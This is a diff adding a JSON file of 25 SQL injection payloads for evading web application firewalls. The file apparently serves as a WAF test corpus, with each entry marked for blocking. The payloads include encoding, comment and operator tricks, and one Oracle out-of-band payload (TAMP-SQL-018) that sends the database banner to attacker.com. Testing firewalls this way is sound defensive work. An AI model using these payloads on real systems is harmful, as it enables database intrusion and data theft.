@@ -1,0 +1,252 @@
+[
+  {
+    "id": "TAMP-SQL-001",
+    "payload": "1'%09AND%091=1--",
+    "tags": ["tamper", "whitespace", "tab", "sqli"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "SQLmap space2tab - replaces spaces with tabs",
+    "category": "WAF-Bypass",
+    "source": "SQLmap/tamper"
+  },
+  {
+    "id": "TAMP-SQL-002",
+    "payload": "1'%0AAND%0A1=1--",
+    "tags": ["tamper", "whitespace", "newline", "sqli"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "SQLmap space2newline - replaces spaces with newlines",
+    "category": "WAF-Bypass",
+    "source": "SQLmap/tamper"
+  },
+  {
+    "id": "TAMP-SQL-003",
+    "payload": "1'%0BAND%0B1=1--",
+    "tags": ["tamper", "whitespace", "vertical-tab", "sqli"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Vertical tab as whitespace bypass",
+    "category": "WAF-Bypass",
+    "source": "SQLmap/tamper"
+  },
+  {
+    "id": "TAMP-SQL-004",
+    "payload": "1'%0CAND%0C1=1--",
+    "tags": ["tamper", "whitespace", "form-feed", "sqli"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Form feed as whitespace bypass",
+    "category": "WAF-Bypass",
+    "source": "SQLmap/tamper"
+  },
+  {
+    "id": "TAMP-SQL-005",
+    "payload": "1'%0DAND%0D1=1--",
+    "tags": ["tamper", "whitespace", "carriage-return", "sqli"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Carriage return as whitespace bypass",
+    "category": "WAF-Bypass",
+    "source": "SQLmap/tamper"
+  },
+  {
+    "id": "TAMP-SQL-006",
+    "payload": "1'%A0AND%A01=1--",
+    "tags": ["tamper", "whitespace", "nbsp", "sqli"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Non-breaking space as whitespace bypass",
+    "category": "WAF-Bypass",
+    "source": "SQLmap/tamper"
+  },
+  {
+    "id": "TAMP-SQL-007",
+    "payload": "1'/**/AND/**/1=1--",
+    "tags": ["tamper", "comment", "inline", "sqli"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "SQLmap space2comment - replaces spaces with inline comments",
+    "category": "WAF-Bypass",
+    "source": "SQLmap/tamper"
+  },
+  {
+    "id": "TAMP-SQL-008",
+    "payload": "1'/*random*/AND/*text*/1=1--",
+    "tags": ["tamper", "comment", "random", "sqli"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "SQLmap randomcomments - random text in comments",
+    "category": "WAF-Bypass",
+    "source": "SQLmap/tamper"
+  },
+  {
+    "id": "TAMP-SQL-009",
+    "payload": "1'/*!12345AND*/1=1--",
+    "tags": ["tamper", "comment", "conditional", "mysql", "sqli"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "MySQL conditional comment bypass (version >= 1.2.3.45)",
+    "category": "WAF-Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "id": "TAMP-SQL-010",
+    "payload": "1'/*!50000AND*/1=1--",
+    "tags": ["tamper", "comment", "conditional", "mysql", "sqli"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "MySQL 5.0+ conditional comment bypass",
+    "category": "WAF-Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "id": "TAMP-SQL-011",
+    "payload": "(1)and(1)=(1)--",
+    "tags": ["tamper", "parenthesis", "no-space", "sqli"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Parenthesis bypass - no spaces needed",
+    "category": "WAF-Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "id": "TAMP-SQL-012",
+    "payload": "1'%252f%252a*/AND%252f%252a*/1=1--",
+    "tags": ["tamper", "double-encode", "comment", "sqli"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Double URL encoding of comment markers",
+    "category": "WAF-Bypass",
+    "source": "SQLmap/tamper"
+  },
+  {
+    "id": "TAMP-SQL-013",
+    "payload": "%53%45%4C%45%43%54 1",
+    "tags": ["tamper", "url-encode", "full", "sqli"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "SQLmap charencode - full URL encoding of SELECT",
+    "category": "WAF-Bypass",
+    "source": "SQLmap/tamper"
+  },
+  {
+    "id": "TAMP-SQL-014",
+    "payload": "%u0053%u0045%u004C%u0045%u0043%u0054 1",
+    "tags": ["tamper", "unicode-encode", "iis", "sqli"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "SQLmap charunicodeescape - IIS Unicode encoding",
+    "category": "WAF-Bypass",
+    "source": "SQLmap/tamper"
+  },
+  {
+    "id": "TAMP-SQL-015",
+    "payload": "1' AnD 1=1--",
+    "tags": ["tamper", "case", "random", "sqli"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "SQLmap randomcase - mixed case keywords",
+    "category": "WAF-Bypass",
+    "source": "SQLmap/tamper"
+  },
+  {
+    "id": "TAMP-SQL-016",
+    "payload": "1' %00AND 1=1--",
+    "tags": ["tamper", "null-byte", "sqli"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Null byte insertion between keywords",
+    "category": "WAF-Bypass",
+    "source": "SQLmap/tamper"
+  },
+  {
+    "id": "TAMP-SQL-017",
+    "payload": "CONCAT(CHAR(83),CHAR(69),CHAR(76),CHAR(69),CHAR(67),CHAR(84)) 1",
+    "tags": ["tamper", "char", "obfuscation", "sqli"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "CHAR() function to spell keywords",
+    "category": "WAF-Bypass",
+    "source": "SQLmap/tamper"
+  },
+  {
+    "id": "TAMP-SQL-018",
+    "payload": "1'||UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version WHERE ROWNUM=1))--",
+    "tags": ["tamper", "oracle", "oob", "sqli"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "Oracle out-of-band data exfiltration",
+    "category": "WAF-Bypass",
+    "source": "SecLists"
+  },
+  {
+    "id": "TAMP-SQL-019",
+    "payload": "1.e(ascii(1.e(substring(1.e(select user())1.e,1 1.e,1 1.e)1.e)1.e) = 70",
+    "tags": ["tamper", "scientific-notation", "mysql", "sqli"],
+    "expected_block": true,
+    "severity_hint": "Critical",
+    "notes": "MySQL scientific notation obfuscation",
+    "category": "WAF-Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "id": "TAMP-SQL-020",
+    "payload": "1' AND 1 LIKE 1--",
+    "tags": ["tamper", "like", "equal-bypass", "sqli"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "LIKE instead of = for equal bypass",
+    "category": "WAF-Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "id": "TAMP-SQL-021",
+    "payload": "1' AND 1 REGEXP 1--",
+    "tags": ["tamper", "regexp", "equal-bypass", "sqli"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "REGEXP instead of = for equal bypass",
+    "category": "WAF-Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "id": "TAMP-SQL-022",
+    "payload": "1' AND 1 BETWEEN 0 AND 2--",
+    "tags": ["tamper", "between", "equal-bypass", "sqli"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "BETWEEN instead of = for equal bypass",
+    "category": "WAF-Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "id": "TAMP-SQL-023",
+    "payload": "1' && 1--",
+    "tags": ["tamper", "operator", "and-bypass", "sqli"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "&& instead of AND",
+    "category": "WAF-Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "id": "TAMP-SQL-024",
+    "payload": "1' || 1--",
+    "tags": ["tamper", "operator", "or-bypass", "sqli"],
+    "expected_block": true,
+    "severity_hint": "High",
+    "notes": "|| instead of OR",
+    "category": "WAF-Bypass",
+    "source": "PayloadsAllTheThings"
+  },
+  {
+    "id": "TAMP-SQL-025",
+    "payload": "LIMIT 1 OFFSET 0",
+    "tags": ["tamper", "limit", "comma-bypass", "sqli"],
+    "expected_block": true,
+    "severity_hint": "Medium",
+    "notes": "OFFSET instead of comma in LIMIT clause",
+    "category": "WAF-Bypass",
+    "source": "PayloadsAllTheThings"
+  }
+]
